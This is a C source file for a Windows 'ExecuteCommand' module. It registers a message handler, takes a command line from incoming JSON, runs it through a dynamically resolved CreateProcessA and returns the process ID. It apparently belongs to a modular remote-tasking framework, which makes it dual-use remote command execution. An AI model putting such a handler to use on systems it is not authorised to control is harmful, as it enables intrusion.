#include <windows.h>
#include <stdio.h>

#pragma message( "Compiling with DEBUGGING messages hardcoded in " __FILE__ )
#define _VERBOSE
#define DEBUG_LEVEL DEBUG_VERBOSE
#include "DebugOutput.h"
#include "LIB_Utilities.h"
#include "cJSON.h"

#include "LIB_ExecuteCommand.h"
#include "Internal_Functions.h"


// Global variables
cJSON* g_ExecuteCommand_lpJsonExecuteCommandConfig = NULL;


DWORD WINAPI ExecuteCommandInitialization(
	IN	PBYTE	lpInputBuffer,
	IN	DWORD	dwInputBufferSize,
	OUT PBYTE*	lppOutputBuffer,
	OUT PDWORD	lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	cJSON*	lpJsonExecuteCommandInitializeInput = NULL;

	BOOL	bRegisterResult = FALSE;

	PBYTE	pBuffer = NULL;
	int		nBufferSize = 0;

	cJSON*	lpJsonExecuteCommandInitializeOutput = NULL;
	CHAR*	szExecuteCommandOutput = NULL;
	DWORD	dwExecuteCommandOutputSize = 0;

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);

			/********************************************************************************
				Check arguments
			********************************************************************************/
			//if (NULL == lppOutputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lppOutputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			if (NULL == lpInputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpInputBuffer is NULL.\n")
				);
				__leave;
			}


			/********************************************************************************
				Convert input string into JSON
			********************************************************************************/
			lpJsonExecuteCommandInitializeInput = cJSON_Parse((CHAR*)lpInputBuffer);
			if (NULL == lpJsonExecuteCommandInitializeInput)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Parse(%p) failed."),
					(CHAR*)lpInputBuffer
				);
				__leave;
			}

			// Set the local module's configuration to the input configuration
			g_ExecuteCommand_lpJsonExecuteCommandConfig = lpJsonExecuteCommandInitializeInput;
			// and then null the input configuration so it isn't free'd in the finally
			lpJsonExecuteCommandInitializeInput = NULL;


			/********************************************************************************
				Initialize internal functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Initialize_ExecuteCommand_Kernel32_Functions()"));
			dwErrorCode = Initialize_ExecuteCommand_Kernel32_Functions();
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(DEBUG_ERROR, TEXT("Initialize_ExecuteCommand_Kernel32_Functions() failed.(%08x)"), dwErrorCode);
				__leave;
			}


			/********************************************************************************
				Perform additional initialization actions
			********************************************************************************/


			/********************************************************************************
				Register callback functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Register ExecuteCommand_Request"));
			bRegisterResult = RegisterModuleMessageHandler(
				g_ExecuteCommand_lpJsonExecuteCommandConfig,
				ExecuteCommand_Request,
				ExecuteCommandCallbackInterface
			);
			if (FALSE == bRegisterResult)
			{
				//dwErrorCode = ERROR_BAD_PROVIDER;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("RegisterModuleMessageHandler(%p, %S, %p) failed."),
					g_ExecuteCommand_lpJsonExecuteCommandConfig,
					ExecuteCommand_Request,
					ExecuteCommandCallbackInterface
				);
				//__leave;
			}
			else
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Register ExecuteCommand_Request was successful."));
			}


			/********************************************************************************
				Create output message based on results
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Create output message based on results"));
			//szExecuteCommandOutput = cJSON_Print(lpJsonExecuteCommandInitializeOutput);
			//if (NULL == szExecuteCommandOutput)
			//{
			//	dwErrorCode = ERROR_OBJECT_NOT_FOUND;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("cJSON_Print(%p) failed."),
			//		lpJsonExecuteCommandInitializeOutput
			//	);
			//	__leave;
			//}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("szExecuteCommandOutput:     %p"), szExecuteCommandOutput);
			////printf("szExecuteCommandOutput:\n%s\n", szExecuteCommandOutput);
			//dwExecuteCommandOutputSize = (DWORD)strlen(szExecuteCommandOutput);

			//(*lppOutputBuffer) = (LPBYTE)szExecuteCommandOutput;
			//(*lpdwOutputBufferSize) = dwExecuteCommandOutputSize;

		} // end try-finally
		__finally
		{
			// Delete input and output JSON objects
			if (NULL != lpJsonExecuteCommandInitializeInput)
			{
				cJSON_Delete(lpJsonExecuteCommandInitializeInput);
				lpJsonExecuteCommandInitializeInput = NULL;
			}
			if (NULL != lpJsonExecuteCommandInitializeOutput)
			{
				cJSON_Delete(lpJsonExecuteCommandInitializeOutput);
				lpJsonExecuteCommandInitializeOutput = NULL;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


DWORD WINAPI ExecuteCommandFinalization(
	IN	PBYTE	lpInputBuffer,
	IN	DWORD	dwInputBufferSize,
	OUT PBYTE*	lppOutputBuffer,
	OUT PDWORD	lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	CHAR*	szExecuteCommandInput = NULL;
	DWORD	dwExecuteCommandInputSize = 0;
	cJSON*	lpJsonInput = NULL;
	cJSON*	lpJsonMessageType = NULL;

	BOOL	bRegisterResult = FALSE;

	PBYTE	pBuffer = NULL;
	int		nBufferSize = 0;

	CHAR*	szExecuteCommandOutput = NULL;
	DWORD	dwExecuteCommandOutputSize = 0;
	cJSON*	lpJsonExecuteCommandOutput = NULL;

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);

			/********************************************************************************
				Check arguments
			********************************************************************************/
			//if (NULL == lppOutputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lppOutputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			//if (NULL == lpInputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lpInputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			//szExecuteCommandInput = (char*)lpInputBuffer;
			//dwExecuteCommandInputSize = dwInputBufferSize;


			/********************************************************************************
				Unregister callback functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Unregister ExecuteCommand_Request"));
			bRegisterResult = UnregisterModuleMessageHandler(
				g_ExecuteCommand_lpJsonExecuteCommandConfig,
				ExecuteCommand_Request
			);
			if (FALSE == bRegisterResult)
			{
				//dwErrorCode = ERROR_BAD_PROVIDER;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("UnregisterModuleMessageHandler(%p, %S) failed."),
					g_ExecuteCommand_lpJsonExecuteCommandConfig,
					ExecuteCommand_Request
				);
				//__leave;
			}
			else
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Unregister ExecuteCommand_Request was successful."));
			}


			/********************************************************************************
				Perform additional Finalization actions
			********************************************************************************/


			/********************************************************************************
				Finalize internal functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Finalize_ExecuteCommand_Kernel32_Functions()"));
			dwErrorCode = Finalize_ExecuteCommand_Kernel32_Functions();
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(DEBUG_ERROR, TEXT("Finalize_ExecuteCommand_Kernel32_Functions() failed.(%08x)"), dwErrorCode);
				__leave;
			}


		} // end try-finally
		__finally
		{
			/********************************************************************************
				Delete local JSON config
			********************************************************************************/
			if (NULL != g_ExecuteCommand_lpJsonExecuteCommandConfig)
			{
				cJSON_Delete(g_ExecuteCommand_lpJsonExecuteCommandConfig);
				g_ExecuteCommand_lpJsonExecuteCommandConfig = NULL;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}


DWORD WINAPI ExecuteCommandCallbackInterface(
	IN LPBYTE	lpInputBuffer,
	IN DWORD	dwInputBufferSize,
	OUT LPBYTE* lppOutputBuffer,
	OUT LPDWORD lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	CHAR*	szExecuteCommandInput = NULL;
	DWORD	dwExecuteCommandInputSize = 0;
	cJSON*	lpJsonInput = NULL;
	cJSON*	lpJsonExecuteCommandRequestCommandLine = NULL;
	CHAR*	szCommandLine = NULL;
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	CHAR*	szExecuteCommandOutput = NULL;
	DWORD	dwExecuteCommandOutputSize = 0;
	cJSON*	lpJsonExecuteCommandOutput = NULL;
	cJSON*	lpJsonExecuteCommandResponseProcessId = NULL;

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);


			/********************************************************************************
				Check arguments
			********************************************************************************/
			if (NULL == lppOutputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lppOutputBuffer is NULL.\n")
				);
				__leave;
			}
			if (NULL == lpInputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpInputBuffer is NULL.\n")
				);
				__leave;
			}
			szExecuteCommandInput = (char*)lpInputBuffer;
			dwExecuteCommandInputSize = dwInputBufferSize;
			

			/********************************************************************************
				Parse input arguments
			********************************************************************************/
			lpJsonInput = cJSON_Parse(szExecuteCommandInput);
			if (NULL == lpJsonInput)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Parse(%p) failed."),
					szExecuteCommandInput
				);
				__leave;
			}


			/********************************************************************************
				Create the output JSON object
			********************************************************************************/
			// Create the output JSON object
			lpJsonExecuteCommandOutput = cJSON_CreateObject();
			if (NULL == lpJsonExecuteCommandOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonExecuteCommandOutput = cJSON_CreateObject failed.\n")
				);
				__leave;
			}

			
			/********************************************************************************
				Perform action given input parameters
			********************************************************************************/
			// Get the array of ExecuteCommand_Registry_Entries
			lpJsonExecuteCommandRequestCommandLine = cJSON_GetObjectItemCaseSensitive(lpJsonInput, ExecuteCommand_Request_CommandLine);
			if (NULL == lpJsonExecuteCommandRequestCommandLine)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonInput,
					ExecuteCommand_Request_CommandLine
				);
				__leave;
			}

			// Get the actual command-line string from the JSON object
			szCommandLine = cJSON_GetStringValue(lpJsonExecuteCommandRequestCommandLine);
			if (NULL == szCommandLine)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("szCommandLine = cJSON_GetStringValue(%p) failed."),
					lpJsonExecuteCommandRequestCommandLine
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("szCommandLine: %S"), szCommandLine);

			ZeroMemory(&si, sizeof(si));
			si.cb = sizeof(si);
			ZeroMemory(&pi, sizeof(pi));
			
			DBGPRINT(
				DEBUG_VERBOSE,
				TEXT("m_ExecuteCommand_CreateProcessA( %p, %p, %p, %p, %08x, %08x, %p, %p, %p, %p )"),
				NULL,			// No module name (use command line)
				szCommandLine,	// Command line
				NULL,			// Process handle not inheritable
				NULL,			// Thread handle not inheritable
				FALSE,			// Set handle inheritance to FALSE
				0,				// No creation flags
				NULL,			// Use parent's environment block
				NULL,			// Use parent's starting directory 
				&si,			// Pointer to STARTUPINFO structure
				&pi
			);
			if ( NULL == m_ExecuteCommand_CreateProcessA(
					NULL,			// No module name (use command line)
					szCommandLine,	// Command line
					NULL,			// Process handle not inheritable
					NULL,			// Thread handle not inheritable
					FALSE,			// Set handle inheritance to FALSE
					0,				// No creation flags
					NULL,			// Use parent's environment block
					NULL,			// Use parent's starting directory 
					&si,			// Pointer to STARTUPINFO structure
					&pi				// Pointer to PROCESS_INFORMATION structure
				)
			)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("m_ExecuteCommand_CreateProcessA( %p, %p, %p, %p, %08x, %08x, %p, %p, %p, %p ) failed. (%08x)"),
					NULL,			// No module name (use command line)
					szCommandLine,	// Command line
					NULL,			// Process handle not inheritable
					NULL,			// Thread handle not inheritable
					FALSE,			// Set handle inheritance to FALSE
					0,				// No creation flags
					NULL,			// Use parent's environment block
					NULL,			// Use parent's starting directory 
					&si,			// Pointer to STARTUPINFO structure
					&pi,			// Pointer to PROCESS_INFORMATION structure
					dwErrorCode
				);
				__leave;
			}
				
			// Create the ExecuteCommand_Response_ProcessId 
			DBGPRINT(DEBUG_VERBOSE, TEXT("pi.dwProcessId: %d"), pi.dwProcessId);
			lpJsonExecuteCommandResponseProcessId = cJSON_CreateNumber(pi.dwProcessId);
			if (NULL == lpJsonExecuteCommandResponseProcessId)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonExecuteCommandResponseProcessId = cJSON_CreateNumber failed.\n")
				);
				__leave;
			}
			// Add the ExecuteCommand_Response_ProcessId to the current entry
			cJSON_AddItemToObject(lpJsonExecuteCommandOutput, ExecuteCommand_Response_ProcessId, lpJsonExecuteCommandResponseProcessId);


			/********************************************************************************
				Create output message based on results
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Create output message based on results"));
			szExecuteCommandOutput = cJSON_Print(lpJsonExecuteCommandOutput);
			if (NULL == szExecuteCommandOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Print(%p) failed."),
					lpJsonExecuteCommandOutput
				);
				__leave;
			}
			dwExecuteCommandOutputSize = (DWORD)strlen(szExecuteCommandOutput);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("dwExecuteCommandOutputSize: %d"), dwExecuteCommandOutputSize);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("szExecuteCommandOutput:     %p"), szExecuteCommandOutput);
			//printf("szExecuteCommandOutput:\n%s\n", szExecuteCommandOutput);

			(*lppOutputBuffer) = (LPBYTE)szExecuteCommandOutput;
			(*lpdwOutputBufferSize) = dwExecuteCommandOutputSize;

		} // end try-finally
		__finally
		{
			if (NULL != lpJsonInput)
			{
				cJSON_Delete(lpJsonInput);
				lpJsonInput = NULL;
			}

			if (NULL != lpJsonExecuteCommandOutput)
			{
				cJSON_Delete(lpJsonExecuteCommandOutput);
				lpJsonExecuteCommandOutput = NULL;
			}

			if (ERROR_SUCCESS != dwErrorCode)
			{
				if (NULL != (*lppOutputBuffer))
				{
					//dwTempErrorCode = FREE(*lppOutputBuffer);
					//if (ERROR_SUCCESS != dwTempErrorCode)
					//{
					//	DBGPRINT(DEBUG_ERROR, TEXT("FREE failed.(%08x)"), dwTempErrorCode);
					//}

					cJSON_free(szExecuteCommandOutput);
					*lppOutputBuffer = NULL;
				}
				*lpdwOutputBufferSize = 0;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}
